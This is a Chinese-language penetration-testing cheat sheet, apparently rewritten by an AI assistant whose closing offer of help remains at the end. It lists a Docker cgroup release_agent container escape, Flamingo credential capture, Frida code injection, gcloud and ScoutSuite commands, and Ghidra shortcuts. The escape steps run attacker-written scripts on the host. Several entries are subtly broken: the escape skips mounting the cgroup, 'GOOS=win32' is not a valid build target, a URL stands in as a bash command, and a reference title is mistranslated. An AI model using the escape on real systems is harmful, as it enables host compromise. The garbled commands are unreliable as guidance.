### 创建和配置Cgroup

1. 创建临时目录：
   ```bash
   mkdir /tmp/cgrp/x
   ```

2. 启用释放通知：
   ```bash
   echo 1 > /tmp/cgrp/x/notify_on_release
   ```

3. 获取主机路径：
   ```bash
   host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
   ```

4. 配置释放代理：
   ```bash
   echo "$host_path/cmd" > /tmp/cgrp/release_agent
   ```

5. 创建并配置命令脚本：
   ```bash
   echo '#!/bin/sh' > /cmd
   echo "ps aux > $host_path/output" >> /cmd
   chmod a+x /cmd
   ```

6. 将当前进程添加到cgroup：
   ```bash
   sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
   ```

**参考文献:**
- [Understanding Docker Container Escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)

---

### Flamingo

**红队工具**
- **用途:** 捕获网络中由各种IT和安全产品喷洒的凭证。目前支持SSH、HTTP、LDAP、DNS、FTP和SNMP凭证收集。
- **获取方式:**
  - 从发布页面下载Flamingo二进制文件，或从源代码构建。
  - 构建Windows版本:
    ```bash
    GOOS=win32 GOARCH=amd64 go build -o flamingo.exe
    ```
  - 安装并运行:
    ```bash
    go get -u -v github.com/atredispartners/flamingo
    go install -v github.com/atredispartners/flamingo
    $GOPATH/bin/flamingo
    ```

- **运行示例:**
  ```bash
  C:\> flamingo.exe
  ```

- **日志输出:**
  - 默认输出到标准输出和`flamingo.log`文件。
  - 支持多种输出格式：标准输出、文件、HTTP Webhook、Syslog。

**参考文献:**
- [Flamingo Captures Credentials](https://www.atredis.com/blog/2020/1/26/flamingo-captures-credentials)
- [Flamingo GitHub](https://github.com/atredispartners/flamingo)
- [Flamingo Releases](https://github.com/atredispartners/flamingo/releases)

---

### Frida

**红队工具**
- **用途:** 动态代码注入工具，允许您将JavaScript片段或自定义库注入到Windows、macOS、GNU/Linux、iOS、Android和QNX上的本地应用程序中。

**基本操作:**
- 列出Frida可用设备:
  ```bash
  frida-ls-devices
  ```
- 在设备上运行Frida服务器:
  ```bash
  adb shell "su -c 'chmod 755 /data/local/tmp/frida-server'"
  adb shell "su -c '/data/local/tmp/frida-server' &"
  ```
- 跟踪Chrome中的open调用:
  ```bash
  frida-trace -U -i open com.android.chrome
  ```

**Frida CLI:**
- 连接到应用程序并开始调试:
  ```bash
  frida -U
  ```
- 加载脚本:
  ```bash
  frida Calculator -l calc.js
  ```
- 列出运行中的进程:
  ```bash
  frida-ps -U
  ```

**iOS注意事项:**
- 对于非越狱iPhone，可以使用Frida Gadget技术重新编译应用并嵌入Frida Gadget。

**参考文献:**
- [Frida官方文档](https://frida.re/)
- [Frida GitHub](https://github.com/frida/frida)
- [Awesome Frida](https://github.com/dweinstein/awesome-frida)

---

### GCP CLI

**管理Google Cloud API的认证、本地配置、开发工作流和交互。**

**基本命令:**
- 查看版本和设置:
  ```bash
  gcloud version
  gcloud info
  gcloud components list
  ```
- 初始化配置文件:
  ```bash
  gcloud init
  ```

**存储桶操作:**
- 列出所有存储桶和文件:
  ```bash
  gsutil ls
  gsutil ls -lh gs://
  ```
- 上传和下载文件:
  ```bash
  gsutil cp local_file gs://bucket_name/
  gsutil cp gs://bucket_name/remote_file local_file
  ```

**项目管理:**
- 列出项目:
  ```bash
  gcloud config list
  gcloud config list project
  ```
- 显示项目信息:
  ```bash
  gcloud compute project-info describe
  ```

**Kubernetes引擎 (GKE):**
- 列出容器集群:
  ```bash
  gcloud container clusters list
  ```
- 设置kubectl上下文:
  ```bash
  gcloud container clusters get-credentials cluster_name
  ```

**IAM:**
- 列出认证账户:
  ```bash
  gcloud auth list
  ```
- 设置活动账户:
  ```bash
  gcloud config set account account_name
  ```

**参考文献:**
- [GCP SDK快速入门](https://cloud.google.com/sdk/docs/quickstart-linux)
- [gsutil文档](https://cloud.google.com/storage/docs/gsutil)

---

### GCP防御

**蓝队工具**
- **用途:** 提供丰富的日志数据集以帮助识别特定的安全事件。

**日志类型:**
- **Cloud Audit Logs:** 记录“谁做了什么，在哪里，什么时候”。
- **App Logs:** Stackdriver Logging收集容器的标准输出和错误日志。
- **基础设施日志:** 提供操作系统、集群和网络级别的活动和事件洞察。
- **GKE审计日志:** 记录对Kubernetes API服务器的调用。
- **VPC Flow Logs:** 记录虚拟机实例发送和接收的网络流量。

**参考文献:**
- [GKE安全控制和取证分析](https://cloud.google.com/solutions/security-controls-and-forensic-analysis-for-GKE-apps)

---

### GCP漏洞利用

**红队工具**
- **用途:** 使用Scout Suite进行多云安全审计，评估云环境的安全态势。

**步骤:**
1. 下载并安装Gcloud命令行工具:
   ```bash
   https://cloud.google.com/pubsub/docs/quickstart-cli
   ```
2. 设置目标凭据:
   ```bash
   gcloud config set account account_name
   ```
3. 执行Scout Suite:
   ```bash
   python scout.py --provider gcp --user-account
   python scout.py --provider gcp --service-account --key-file /path/to/keyfile
   ```
4. 扫描GCP账户:
   ```bash
   Organization: organization-id
   Folder: folder-id
   Project: project-id
   ```

**参考文献:**
- [ScoutSuite GitHub](https://github.com/nccgroup/ScoutSuite)
- [Plundering GCP: 抄袭Google Cloud Platform权限](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

---

### GCP加固

**蓝队工具**
- **用途:** 硬化GKE集群以提高安全性。

**参考文献:**
- [GKE硬化指南](https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster)

---

### GCP术语

**信息性工具**
- **用途:** 提供Google Cloud产品的速查表。

**参考文献:**
- [Google Cloud开发者速查表](https://github.com/gregsramblings/google-cloud-4-words)
- [Google Cloud产品终极速查表](https://www.intelligencepartner.com/en/definitive-cheat-sheet-for-google-cloud-products/)

---

### Ghidra

**红/蓝队工具**
- **用途:** 由NSA开发的软件逆向工程框架，用于挖掘专有程序的源代码，检测恶意威胁或潜在漏洞。

**快捷键:**
- 新建项目: `Ctrl+N` 或 `File → New Project`
- 打开项目: `Ctrl+O` 或 `File → Open Project`
- 关闭项目: `Ctrl+W` 或 `File → Close Project`

希望这些优化后的文本能更清晰、连贯和专业地传达信息。如果有任何进一步的需求，请告诉我！